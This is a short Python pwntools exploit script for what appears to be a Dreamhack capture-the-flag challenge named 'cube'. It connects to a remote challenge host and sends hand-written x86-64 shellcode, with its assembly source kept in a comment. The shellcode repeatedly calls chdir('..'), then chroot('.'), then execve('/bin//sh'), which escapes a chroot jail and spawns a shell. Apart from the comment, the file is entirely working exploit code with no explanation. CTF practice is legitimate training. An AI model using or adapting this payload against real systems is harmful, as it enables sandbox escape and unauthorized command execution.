#!/usr/bin/python3

from pwn import *

#p = process("./cube")
p = remote("host1.dreamhack.games", 19010)

shellcode = "\xBB\x2E\x2E\x00\x00\x53\x54\x5F\x48\x31\xC9\x4D\x31\xC0\x4C\x89\xC1\xB8\x50\x00\x00\x00\x0F\x05\x49\x83\xF8\x10\x74\x05\x49\xFF\xC0\xEB\xEB\x48\x31\xDB\xB3\x2E\x53\x54\x5F\xB0\xA1\x0F\x05\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\x48\x31\xC0\xB0\x3B\x0F\x05"

p.sendlineafter(": ", shellcode)

p.interactive()

"""
section .text
	global _start

_start:
	mov rbx, 0x2e2e
	push rbx
	push rsp
	pop rdi
	xor rcx, rcx
	xor r8, r8
.L1:
	mov rcx, r8
	mov rax, 0x50
	syscall
	cmp r8, 0x10
	je .L2
	inc r8
	jmp .L1
.L2:
	xor rbx, rbx
	mov bl, 0x2e
	push rbx
	push rsp
	pop rdi
	mov al, 0xa1
	syscall
	push rax
	xor rdx, rdx
	xor rsi, rsi
	mov rbx,0x68732f2f6e69622f
	push rbx
	push rsp
	pop rdi
	xor rax, rax
	mov al, 0x3b
	syscall
"""
